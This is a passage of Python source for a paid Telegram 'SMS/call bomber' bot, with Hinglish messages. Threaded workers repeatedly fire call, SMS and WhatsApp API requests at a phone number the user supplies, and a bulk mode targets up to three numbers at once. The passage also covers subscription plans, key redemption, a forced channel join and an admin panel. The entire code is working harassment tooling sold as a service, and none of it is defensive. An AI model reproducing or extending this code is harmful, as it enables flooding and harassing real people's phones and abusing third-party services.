                        self.sessions[chat_id]["stats"]["fail"] += fail_count
                        self.sessions[chat_id]["stats"]["total"] += ok_count + fail_count
            except:
                pass
            time.sleep(IMPORTANT_CALL_INTERVAL)

    def _important_five_second_worker(self, chat_id, stop_event):
        """5-second important APIs — fire exactly once every 5 seconds"""
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]

        while not stop_event.is_set():
            try:
                futures = []
                for api in IMPORTANT_5S_APIS:
                    futures.append(self.executor.submit(self._fire_api, api, phone))

                for f in as_completed(futures):
                    name, status, size, err = f.result()
                    with self.lock:
                        if chat_id in self.sessions:
                            if 200 <= status < 400 and size > 0:
                                self.sessions[chat_id]["stats"]["ok"] += 1
                            else:
                                self.sessions[chat_id]["stats"]["fail"] += 1
                            self.sessions[chat_id]["stats"]["total"] += 1
            except:
                pass
            time.sleep(IMPORTANT_5S_INTERVAL)

    def start(self, chat_id, phone, mode, username=None):
        with self.lock:
            if chat_id in self.sessions:
                return False, "Already running! Pehle Stop karein."
            
            # Check subscription limits for non-admin users
            if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
                sub = admin_db.get_subscription(chat_id)
                if not sub:
                    return False, "❌ *No Active Plan!*\n\nAapke paas koi active plan nahi hai.\n📋 Plans mein dekh kar key redeem karein ya admin se contact karein."
            
            # Track in admin DB
            admin_db.track_user(chat_id, username, phone, mode)
            stop_event = threading.Event()
            stats = {"ok": 0, "fail": 0, "rounds": 0, "total": 0, "start_time": datetime.now(), "elapsed": "0s"}
            self.sessions[chat_id] = {
                "phone": phone, "mode": mode, "stop_event": stop_event,
                "stats": stats, "thread": None, "imp_thread": None, "imp5s_thread": None,
                "user_id": chat_id, "username": username
            }
            thread = threading.Thread(target=self._worker, args=(chat_id, stop_event), daemon=True)
            thread.start()
            self.sessions[chat_id]["thread"] = thread
            # Spawn important API thread for call/mix modes (fires every 3s)
            if mode in ["call", "mix"]:
                imp_thread = threading.Thread(target=self._important_worker, args=(chat_id, stop_event), daemon=True)
                imp_thread.start()
                self.sessions[chat_id]["imp_thread"] = imp_thread
            # Spawn 5-second important API thread for ALL modes (fires exactly every 5s)
            imp5s_thread = threading.Thread(target=self._important_five_second_worker, args=(chat_id, stop_event), daemon=True)
            imp5s_thread.start()
            self.sessions[chat_id]["imp5s_thread"] = imp5s_thread
            
            # Send initial bombing active message with stop button
            try:
                stop_markup = types.InlineKeyboardMarkup()
                stop_markup.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing"))
                bot.send_message(chat_id,
                    f"💣 *BOMBING ACTIVE* 💣\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"💣 Target: `{phone}`\n"
                    f"✅ Hits: 0/0\n"
                    f"📊 Progress: [{'░' * 30}] 0.0%\n"
                    f"⏱️ Time Elapsed: 0s\n"
                    f"🎯 Mode: *{mode.upper()}*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"⚡ Full attack initiated...",
                    parse_mode="Markdown", reply_markup=stop_markup)
            except:
                pass
            
            return True, f"🔥 *{mode.upper()} started for* `{phone}`"

    def stop(self, chat_id):
        with self.lock:
            if chat_id not in self.sessions:
                return False, "❌ Koi active session nahi hai."
            self.sessions[chat_id]["stop_event"].set()
            elapsed = datetime.now() - self.sessions[chat_id]["stats"]["start_time"]
            s = self.sessions[chat_id]["stats"]
            # Save stats to admin DB
            admin_db.update_stats(chat_id, s['ok'], s['fail'], s['rounds'], s['total'])
            total = s['total']
            ok = s['ok']
            pct = (ok / max(total, 1)) * 100
            bar_len = 30
            filled = int(bar_len * pct / 100)
            bar = "█" * filled + "░" * (bar_len - filled)
            del self.sessions[chat_id]
            return True, (f"💥 *BOMBING COMPLETE* 💥\n"
                         f"━━━━━━━━━━━━━━━━━━━━━\n"
                         f"✅ Final Hits: {ok}/{total}\n"
                         f"📊 Progress: [{bar}] {pct:.1f}%\n"
                         f"⏱️ Duration: {str(elapsed).split('.')[0]}\n"
                         f"🔄 Total Rounds: {s['rounds']}\n"
                         f"━━━━━━━━━━━━━━━━━━━━━\n"
                         f"🛑 Session terminated. /start for new session!")

    def get_status(self, chat_id):
        with self.lock:
            if chat_id not in self.sessions:
                return None
            s = self.sessions[chat_id]
            elapsed = datetime.now() - s["stats"]["start_time"]
            elapsed_str = str(elapsed).split('.')[0]
            s["stats"]["elapsed"] = elapsed_str
            return {
                "phone": s["phone"], "mode": s["mode"],
                "ok": s["stats"]["ok"], "fail": s["stats"]["fail"],
                "rounds": s["stats"]["rounds"], "total": s["stats"]["total"],
                "elapsed": elapsed_str
            }

    def stop_all(self):
        with self.lock:
            ids = list(self.sessions.keys())
            for chat_id in ids:
                s = self.sessions[chat_id]["stats"]
                admin_db.update_stats(chat_id, s['ok'], s['fail'], s['rounds'], s['total'])
                self.sessions[chat_id]["stop_event"].set()
            self.sessions.clear()
            return len(ids)

bomber = UltraBomber()

# ============================================================
# CHANNEL CHECK — Force users to join before using bomber
# ============================================================
def is_channel_member(user_id):
    """Check if user has joined the required channel"""
    if user_id in ADMIN_IDS:
        return True  # Admin always has access
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        result = member.status in ["member", "administrator", "creator"]
        # Bot admin hai — real result do
        return result
    except Exception as e:
        # Bot admin nahi hai channel mein — check verified list
        print(f"⚠️ Channel check failed (bot not admin?): {e}")
        return admin_db.is_verified(user_id)

def join_channel_required(func):
    """Decorator to check channel membership before running handler"""
    def wrapper(message, *args, **kwargs):
        chat_id = message.chat.id
        if not is_channel_member(chat_id) and chat_id not in ADMIN_IDS:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
            markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_joined"))
            bot.reply_to(message,
                f"⚠️ *Channel Join Required!*\n\n"
                f"Bot use karne ke liye pehle hamare channel ko join karein:\n\n"
                f"👉 {CHANNEL_LINK}\n\n"
                f"Channel join karne ke baad '✅ Joined' button dabayein.",
                parse_mode="Markdown", reply_markup=markup)
            return
        return func(message, *args, **kwargs)
    return wrapper

def subscription_required(func):
    """Decorator to check active subscription before running handler"""
    def wrapper(message, *args, **kwargs):
        chat_id = message.chat.id
        # Admin bypass
        if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
            sub = admin_db.get_subscription(chat_id)
            if not sub:
                markup = types.InlineKeyboardMarkup(row_width=2)
                markup.add(
                    types.InlineKeyboardButton("📋 Plans", callback_data="goto_plans"),
                    types.InlineKeyboardButton("🎁 Redeem", callback_data="goto_redeem"),
                )
                bot.reply_to(message,
                    "🚫 *No Active Subscription!*\n\n"
                    "Aapke paas koi active subscription nahi hai.\n\n"
                    "👉 /plans se subscription kharidein\n"
                    "👉 /redeem se key redeem karein\n\n"
                    "Subscription lene ke baad hi aap bot use kar sakte hain.",
                    parse_mode="Markdown", reply_markup=markup)
                return
        return func(message, *args, **kwargs)
    return wrapper

# ============================================================
# KEYBOARDS
# ============================================================
def main_keyboard(user_id=None):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        types.KeyboardButton("🔥 MIX"),
        types.KeyboardButton("💥 Bulk MIX"),
        types.KeyboardButton("📞 CALL"),
        types.KeyboardButton("🛡 Protect"),
        types.KeyboardButton("🔓 Unprotect"),
        types.KeyboardButton("📊 Status"),
        types.KeyboardButton("👤 Account"),
        types.KeyboardButton("❓ Help"),
        types.KeyboardButton("📋 Plans"),
        types.KeyboardButton("🎁 Redeem"),
        types.KeyboardButton("🛑 Stop"),
    ]
    # Admin panel button — only visible to admin users
    if user_id and (user_id in ADMIN_IDS or admin_db.is_admin(user_id)):
        buttons.append(types.KeyboardButton("⚙️ Admin"))
    markup.add(*buttons)
    return markup

# ============================================================
# BOT HANDLERS
# ============================================================
@bot.message_handler(commands=['start'])
@join_channel_required
def cmd_start(message):
    chat_id = message.chat.id
    user = message.from_user
    name = f"{user.first_name} {user.last_name or ''}".strip()
    name_display = name if name else user.username or "User"

    # Ban check
    if admin_db.is_banned(chat_id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    
    # Send welcome photo + message
    welcome_msg = (
        f"🛰️ *SYSTEM GATEWAY* 🛰️\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: {name_display} (ID: {chat_id})\n\n"
        f"👋 Welcome to the Bot!\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ *No Active Subscription Detected*\n\n"
        f"You do not have an active plan currently assigned to your account.\n\n"
        f"🎟️ *To Subscribe:*\n"
        f"▫️ Use /plan to view pricing & purchase\n"
        f"▫️ Use /redeem to activate using a code\n\n"
        f"💡 *We are ready when you are!*"
    )
    try:
        bot.send_photo(chat_id, WELCOME_IMAGE, caption=welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
    except:
        bot.send_message(chat_id, welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

@bot.message_handler(commands=['help'])
@join_channel_required
def cmd_help(message):
    if admin_db.is_banned(message.chat.id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    bot.reply_to(message,
        "❓ *Help*\n\n"
        "📞 *Call Only* — Sirf call APIs\n"
        "💬 *SMS Only* — Sirf SMS APIs\n"
        "📱 *WhatsApp Only* — Sirf WhatsApp APIs\n"
        "🔥 *MIX (All)* — Saare APIs ek saath!\n"
        "🛑 *Stop* — Band karein\n"
        "📊 *Status* — Current session ki jankari\n\n"
        "⚡ *50 concurrent workers* (Call/WhatsApp/Mix)\n"
        "⚡ *100 concurrent workers* (SMS Mode) — Double-fire + Auto-retry\n"
        "⚡ *SMS har 50ms mein naya round* — Non-stop barrage!",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('/') and m.text not in ["/cancel"])
def unknown_cmd(message):
    bot.reply_to(message, "❌ Unknown command. /help dekhein.", reply_markup=main_keyboard(message.chat.id))

@bot.message_handler(func=lambda m: m.text == "❓ Help")
@join_channel_required
def btn_help(message):
    if admin_db.is_banned(message.chat.id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    cmd_help(message)

@bot.message_handler(func=lambda m: m.text == "📊 Status")
@join_channel_required
@subscription_required
def btn_status(message):
    if admin_db.is_banned(message.chat.id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    status = bomber.get_status(message.chat.id)
    if status:
        total = status['total']
        ok = status['ok']
        fail = status['fail']
        pct = (ok / max(total, 1)) * 100
        bar_len = 30
        filled = int(bar_len * pct / 100)
        bar = "█" * filled + "░" * (bar_len - filled)
        bot.reply_to(message,
            f"💣 *BOMBING ACTIVE* 💣\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"💣 Target: `{status['phone']}`\n"
            f"🎯 Mode: *{status['mode'].upper()}*\n"
            f"✅ Hits: {ok}/{total}\n"
            f"📊 Progress: [{bar}] {pct:.1f}%\n"
            f"⏱️ Time Elapsed: {status['elapsed']}",
            parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Koi active session nahi hai. /start karein.", reply_markup=main_keyboard(message.chat.id))

@bot.message_handler(func=lambda m: m.text == "🛑 Stop")
@join_channel_required
def btn_stop(message):
    if admin_db.is_banned(message.chat.id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    success, msg = bomber.stop(message.chat.id)
    bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(message.chat.id))

@bot.message_handler(func=lambda m: m.text in ["🔥 MIX", "💥 Bulk MIX", "📞 CALL"])
@join_channel_required
@subscription_required
def btn_mode(message):
    chat_id = message.chat.id
    if admin_db.is_banned(chat_id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    mode_map = {
        "🔥 MIX": "mix",
        "💥 Bulk MIX": "bulk_mix",
        "📞 CALL": "call",
        "📞 Fake Calling": "call",
    }
    mode = mode_map[message.text]
    username = message.from_user.username or message.from_user.first_name

    # Check if phone is set
    user_data.users.setdefault(chat_id, {})
    phone = user_data.users[chat_id].get("phone")

    if not phone:
        user_data.users[chat_id]["pending_mode"] = mode
        bot.reply_to(message,
            "📱 Pehle phone number bhejo (10-digit):\n\n"
            "Jaise: `9876543210`",
            parse_mode="Markdown")
        return

    # Bulk MIX: ask for 3 numbers
    if mode == "bulk_mix":
        user_data.users[chat_id]["pending_mode"] = "bulk_mix_confirm"
        bot.reply_to(message,
            "💥 *Bulk MIX Mode*\n\n"
            "3 numbers comma se alag karke bhejo:\n\n"
            "Jaise: `9876543210, 9876543211, 9876543212`",
            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return

    success, msg = bomber.start(chat_id, phone, mode, username=username)
    bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))


# ====== PLACEHOLDER HANDLERS FOR NEW BUTTONS ======
# These will be updated with actual functionality later

@bot.message_handler(func=lambda m: m.text == "🛡 Protect")
@join_channel_required
@subscription_required
def btn_protect(message):
    bot.reply_to(message,
        "🛡 *Protect Mode*\n\n"
        "Coming soon! 👀\n"
        "Ye feature abhi develop ho raha hai.",
        parse_mode="Markdown", reply_markup=main_keyboard(message.chat.id))

@bot.message_handler(func=lambda m: m.text == "🔓 Unprotect")
@join_channel_required
@subscription_required
def btn_unprotect(message):
    bot.reply_to(message,
        "🔓 *Unprotect Mode*\n\n"
        "Coming soon! 👀\n"
        "Ye feature abhi develop ho raha hai.",
        parse_mode="Markdown", reply_markup=main_keyboard(message.chat.id))

@bot.message_handler(func=lambda m: m.text == "👤 Account")
@join_channel_required
@subscription_required
def btn_account(message):
    chat_id = message.chat.id
    user = message.from_user
    name = f"{user.first_name} {user.last_name or ''}".strip()
    # Get subscription info
    sub = admin_db.get_subscription(chat_id)
    is_admin_user = chat_id in ADMIN_IDS or admin_db.is_admin(chat_id)
    
    msg = (
        f"👤 *Account Info*\n\n"
        f"🆔 ID: `{chat_id}`\n"
        f"👤 Name: {name}\n"
        f"📛 Username: @{user.username or 'N/A'}\n"
    )
    
    if is_admin_user:
        msg += f"\n👑 *Role: Admin* — Unlimited Access"
    elif sub:
        plan_emoji = {"standard": "🌟", "premium": "⭐", "vip": "👑"}.get(sub["plan"], "📋")
        expires = datetime.fromisoformat(sub["expires_at"])
        days_left = (expires - datetime.now()).days
        msg += (
            f"\n{plan_emoji} *Subscription Active*\n"
            f"📋 Plan: {sub['plan'].upper()}\n"
            f"📅 Expires: {expires.strftime('%d-%m-%Y')} ({days_left} days left)\n"
            f"⚡ Concurrent: {sub['max_concurrent']}\n"
            f"⏰ Max Hours: {sub['max_hours']}h"
        )
    else:
        msg += "\n❌ *No Active Subscription*\nUse /plans to buy or /redeem for key."
    
    # Check if running
    status = bomber.get_status(chat_id)
    if status:
        msg += f"\n\n🔥 *Active Session:*\n📞 {status['phone']} | 🎯 {status['mode'].upper()}\n💣 Hits: {status['total']} | ⏱ {status['elapsed']}"
    
    bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

@bot.message_handler(func=lambda m: m.text == "📋 Plans")
@join_channel_required
def btn_plans(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💳 Buy Standard Plan - ₹99", url=f"tg://user?id={ADMIN_IDS[0]}"),
        types.InlineKeyboardButton("💳 Buy Premium Plan - ₹199", url=f"tg://user?id={ADMIN_IDS[0]}"),
        types.InlineKeyboardButton("💳 Buy VIP Plan - ₹499", url=f"tg://user?id={ADMIN_IDS[0]}"),
        types.InlineKeyboardButton("❓ Contact Admin", url=f"tg://user?id={ADMIN_IDS[0]}"),
    )
    bot.reply_to(message,
        "━━━ *PREMIUM SUBSCRIPTION PLANS* ━━━\n\n"
        "🌟 *STANDARD PLAN* 👑\n"
        "╭────────────────────────\n"
        "├ 🏷️ Price: *₹99*\n"
        "├ ⏳ Validity: *30 Days*\n"
        "├ ⚡ Task Limit: *2 concurrent*\n"
        "├ ⏱️ Max Time: *8 hours/task*\n"
        "╰────────────────────────\n\n"
        "🌟 *PREMIUM PLAN* 👑\n"
        "╭────────────────────────\n"
        "├ 🏷️ Price: *₹199*\n"
        "├ ⏳ Validity: *60 Days*\n"
        "├ ⚡ Task Limit: *5 concurrent*\n"
        "├ ⏱️ Max Time: *24 hours/task*\n"
        "╰────────────────────────\n\n"
        "🌟 *VIP PLAN* 👑\n"
        "╭────────────────────────\n"
        "├ 🏷️ Price: *₹499*\n"
        "├ ⏳ Validity: *Lifetime*\n"
        "├ ⚡ Task Limit: *Unlimited*\n"
        "├ ⏱️ Max Time: *Unlimited*\n"
        "├ 👑 Priority Support\n"
        "╰────────────────────────\n\n"
        "👇 *Click karein aur admin se contact karein:*",
        parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🎁 Redeem")
@join_channel_required
def btn_redeem(message):
    chat_id = message.chat.id
    # Check if already subscribed
    sub = admin_db.get_subscription(chat_id)
    if sub:
        bot.reply_to(message,
            f"✅ *Aapke paas already active subscription hai!*\n\n"
            f"🎯 Plan: {sub['plan'].upper()}\n"
            f"⚡ Concurrent: {sub['max_concurrent']}\n"
            f"⏰ Max Hours: {sub['max_hours']}h",
            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return
    # Ask for key
    admin_data[chat_id] = {"action": "redeem_waiting"}
    bot.reply_to(message,
        "🎁 *Redeem Key*\n\n"
        "Apni key yahan bhejo:\n\n"
        "Jaise: `ABCD-EFGH-IJKL-MNOP`\n\n"
        "/cancel se cancel karo.",
        parse_mode="Markdown", reply_markup=main_keyboard(chat_id))


# User data store
class UserData:
    def __init__(self):
        self.users = {}

user_data = UserData()

# Exclude from fallback: admin button, cancel, and admin input mode
EXCLUDED_FROM_FALLBACK = ["⚙️ Admin", "/cancel", "🛡 Protect", "🔓 Unprotect", "👤 Account", "📋 Plans", "🎁 Redeem", "🛑 Stop"]

@bot.message_handler(func=lambda m: (m.text or "") not in EXCLUDED_FROM_FALLBACK and m.chat.id not in admin_data)
@join_channel_required
@subscription_required
def handle_all(message):
    chat_id = message.chat.id
    text = message.text.strip()

    # Ban check
    if admin_db.is_banned(chat_id) and chat_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*\n\nAdmin se contact karein.", parse_mode="Markdown")
        return

    user_data.users.setdefault(chat_id, {})
    username = message.from_user.username or message.from_user.first_name

    # Check for Bulk MIX pending
    pending = user_data.users[chat_id].get("pending_mode")
    if pending == "bulk_mix_confirm":
        nums = [n.strip() for n in text.split(",") if n.strip()]
        valid_nums = [''.join(filter(str.isdigit, n))[-10:] for n in nums if len(''.join(filter(str.isdigit, n))) >= 10]
        if len(valid_nums) < 2:
            bot.reply_to(message,
                "❌ Kam se kam 2 valid numbers bhejo!\n\n"
                "Jaise: `9876543210, 9876543211, 9876543212`",
                parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            return
        started = 0
        for n in valid_nums[:3]:
            s, m = bomber.start(chat_id, n, "mix", username=username)
            if s:
                started += 1
            time.sleep(1)
        del user_data.users[chat_id]["pending_mode"]
        bot.reply_to(message,
            f"💥 *Bulk MIX Started!*\n\n"
            f"✅ {started} numbers par bombing shuru!\n"
            f"📱 Numbers: {', '.join(valid_nums[:3])}\n\n"
            f"🛑 Admin panel se sab band kar sakte hain!",
            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return

    # Check if it's a phone number
    digits = ''.join(filter(str.isdigit, text))
    if len(digits) >= 10:
        phone = digits[-10:]
        user_data.users[chat_id]["phone"] = phone

        # If there's a pending mode, start immediately
        pending = user_data.users[chat_id].pop("pending_mode", None)
        if pending:
            success, msg = bomber.start(chat_id, phone, pending, username=username)
            bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        else:
            bot.reply_to(message,
                f"✅ Phone `{phone}` set ho gaya!\n\n"
                f"Ab mode select karo:\n"
                f"📞 Call | 💬 SMS | 📱 WhatsApp | 🔥 Mix",
                parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return

    # Check if it's "bomb karo <number>" type message
    if "bomb" in text.lower() or "karo" in text.lower():
        nums = re.findall(r'\d{10,}', text)
        if nums:
            phone = nums[0][:10]
            user_data.users[chat_id]["phone"] = phone
            bot.reply_to(message,
                f"✅ Phone `{phone}` set! Ab mode select karo!",
                parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            return

    # Fallback
    bot.reply_to(message,
        "🤷 Kya karna chahte ho?\n\n"
        "1️⃣ Phone number bhejo (10-digit)\n"
        "2️⃣ Phir mode select karo buttons se\n"
        "3️⃣ Ya /start se shuru karo",
        reply_markup=main_keyboard(chat_id))


# ============================================================
# ADMIN PANEL — Complete Administration System
# ============================================================

@bot.message_handler(func=lambda m: m.text == "⚙️ Admin")
def btn_admin_panel(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
        bot.reply_to(message, "🚫 *Access Denied!* Sirf admin ke liye.", parse_mode="Markdown")
        return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("👥 All Users", callback_data="admin_users"),
        types.InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
        types.InlineKeyboardButton("💳 Subs", callback_data="admin_subsusers"),
        types.InlineKeyboardButton("❌ No Sub", callback_data="admin_nonsubs"),
        types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("➕ Add Admin", callback_data="admin_addadmin"),
        types.InlineKeyboardButton("➖ Remove Admin", callback_data="admin_removeadmin"),
        types.InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban"),
        types.InlineKeyboardButton("✅ Unban User", callback_data="admin_unban"),
        types.InlineKeyboardButton("❌ Cancel Sub", callback_data="admin_cancelsub"),
        types.InlineKeyboardButton("🔑 Gen Key", callback_data="admin_genkey"),
        types.InlineKeyboardButton("🔐 View Keys", callback_data="admin_viewkeys"),
        types.InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"),
        types.InlineKeyboardButton("❌ Close", callback_data="admin_close"),
    )
    subs_stats = admin_db.get_subscription_stats()
    admin_list = admin_db.get_admins()
    msg = (
        "⚙️ *Admin Panel*\n\n"
        f"👥 Total Users: {admin_db.get_user_count()}\n"
        f"💳 Subscribed: {subs_stats['active']} (Expired: {subs_stats['expired']})\n"
        f"    ├ Trial: {subs_stats['plans']['trial']}\n"
        f"    ├ Standard: {subs_stats['plans']['standard']}\n"
        f"    ├ Premium: {subs_stats['plans']['premium']}\n"
        f"    └ VIP: {subs_stats['plans']['vip']}\n"
        f"👑 Admins: {len(admin_list) + len(ADMIN_IDS)} (Super: {len(ADMIN_IDS)} + Custom: {len(admin_list)})\n"
        f"🚫 Banned: {admin_db.get_banned_count()}\n"
        f"💣 Total Bombs: {admin_db.get_total_bombs()}\n\n"
        "Chooze karein:"
    )
    bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=markup)

# ====== GENERATE KEY CALLBACKS ======
@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("genkey_"))
def genkey_callback(call):
    chat_id = call.message.chat.id
    if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
        bot.answer_callback_query(call.id, "🚫 Access Denied!", show_alert=True)
        return
    plan = call.data.replace("genkey_", "")
    key = admin_db.generate_key(plan, str(chat_id))
    plan_names = {"standard": "🌟 Standard ₹99", "premium": "🌟 Premium ₹199", "vip": "👑 VIP ₹499"}
    bot.edit_message_text(
        "✅ *Key Generated!*\n\n"
        f"Plan: {plan_names.get(plan, plan)}\n"
        f"Key: `{key}`\n\n"
        "Yeh key abhi ek baar use hogi. User redeem karega toh activate ho jayega.",
        chat_id, call.message.message_id, parse_mode="Markdown")
    bot.answer_callback_query(call.id, f"✅ Key generated: {key}", show_alert=True)


# ====== GOTO CALLBACKS (from subscription prompt) ======
@bot.callback_query_handler(func=lambda c: c.data in ["goto_plans", "goto_redeem"])
def goto_callback(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    if call.data == "goto_plans":
        bot.delete_message(chat_id, msg_id)
        # Send plans message
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("💳 Buy Standard - ₹99", url=f"tg://user?id={ADMIN_IDS[0]}"),
            types.InlineKeyboardButton("💳 Buy Premium - ₹199", url=f"tg://user?id={ADMIN_IDS[0]}"),
            types.InlineKeyboardButton("💳 Buy VIP - ₹499", url=f"tg://user?id={ADMIN_IDS[0]}"),
        )
        bot.send_message(chat_id,
            "━━━ *PREMIUM SUBSCRIPTION PLANS* ━━━\n\n"
            "🌟 *STANDARD PLAN* 👑\n├ 🏷️ ₹99 | 30 Days | 2 concurrent | 8h\n\n"
            "🌟 *PREMIUM PLAN* 👑\n├ 🏷️ ₹199 | 60 Days | 5 concurrent | 24h\n\n"
            "🌟 *VIP PLAN* 👑\n├ 🏷️ ₹499 | Lifetime | Unlimited | Priority\n\n"
            "👇 Admin se contact karein:",
            parse_mode="Markdown", reply_markup=markup)
    elif call.data == "goto_redeem":
        bot.delete_message(chat_id, msg_id)
        admin_data[chat_id] = {"action": "redeem_waiting"}
        bot.send_message(chat_id,
            "🎁 *Redeem Key*\n\nApni key yahan bhejo:\n\nJaise: `ABCD-EFGH-IJKL-MNOP`\n\n/cancel se cancel karo.",
            parse_mode="Markdown")

# ====== STOP BOMBING CALLBACK ======
@bot.callback_query_handler(func=lambda c: c.data == "stop_bombing")
def stop_bombing_callback(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    with bomber.lock:
        if chat_id in bomber.sessions:
            success, msg = bomber.stop(chat_id)
            bot.edit_message_text(f"🛑 *Stopped!* ✅\n\n{msg}", chat_id, msg_id, parse_mode="Markdown")
        else:
            bot.answer_callback_query(call.id, "❌ No active session!", show_alert=True)
    bot.answer_callback_query(call.id)


# ====== CHECK JOINED CALLBACK ======
@bot.callback_query_handler(func=lambda c: c.data == "check_joined")
def check_joined_callback(call):
    chat_id = call.message.chat.id
    if is_channel_member(chat_id):
        bot.answer_callback_query(call.id, "✅ Verified! Bot use kar sakte ho!", show_alert=True)
        bot.delete_message(chat_id, call.message.message_id)
        # Send welcome photo + message
        user = call.from_user
        name = f"{user.first_name} {user.last_name or ''}".strip()
        name_display = name if name else user.username or "User"
        welcome_msg = (
            f"🛰️ *SYSTEM GATEWAY* 🛰️\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 User: {name_display} (ID: {chat_id})\n\n"
            f"👋 Welcome to the Bot!\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ *No Active Subscription Detected*\n\n"
            f"You do not have an active plan currently assigned to your account.\n\n"
            f"🎟️ *To Subscribe:*\n"
            f"▫️ Use /plan to view pricing & purchase\n"
            f"▫️ Use /redeem to activate using a code\n\n"
            f"💡 *We are ready when you are!*"
        )
        try:
            bot.send_photo(chat_id, WELCOME_IMAGE, caption=welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        except:
            bot.send_message(chat_id, welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return
    # Bot admin nahi hai toh manual verify as fallback
    admin_db.verify_user(chat_id)
    bot.answer_callback_query(call.id, "✅ Manually verified! Bot use kar sakte ho!", show_alert=True)
    bot.delete_message(chat_id, call.message.message_id)
    bot.send_message(chat_id,
        "✅ *Manually verified!* Ab aap bot use kar sakte hain.",
        parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

    # Check if bot is admin in channel
    bot_admin = False
    try:
        bot.get_chat_member(REQUIRED_CHANNEL, chat_id)
        bot_admin = True
    except:
        bot_admin = False
    
    if not bot_admin:
        # Bot admin nahi hai — manual verify as fallback
        admin_db.verify_user(chat_id)
        bot.answer_callback_query(call.id, "✅ Manually verified! Bot use kar sakte ho!", show_alert=True)
        bot.delete_message(chat_id, call.message.message_id)
        bot.send_message(chat_id,
            "✅ *Manually verified!* Ab aap bot use kar sakte hain.",
            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
    else:
        bot.answer_callback_query(call.id, "❌ Aapne channel join nahi kiya! Pehle join karein.", show_alert=True)


# ====== ADMIN CALLBACKS ======
@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("admin_"))
def admin_callback(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id

    if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
        bot.answer_callback_query(call.id, "🚫 Access Denied!", show_alert=True)
        return

    action = call.data.replace("admin_", "")

    if action == "close":
        bot.delete_message(chat_id, msg_id)
        bot.answer_callback_query(call.id)
        return

    if action == "genkey":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🌟 Standard ₹99", callback_data="genkey_standard"),
            types.InlineKeyboardButton("🌟 Premium ₹199", callback_data="genkey_premium"),
            types.InlineKeyboardButton("👑 VIP ₹499", callback_data="genkey_vip"),
            types.InlineKeyboardButton("❌ Back", callback_data="admin_refresh"),
        )
        bot.edit_message_text("🔑 *Generate Key*\n\nChoose plan type:", chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    if action == "viewkeys":
        keys = admin_db.get_all_keys()
        if not keys:
            bot.edit_message_text("❌ Koi key generate nahi hui abhi.", chat_id, msg_id)
            bot.answer_callback_query(call.id)
            return
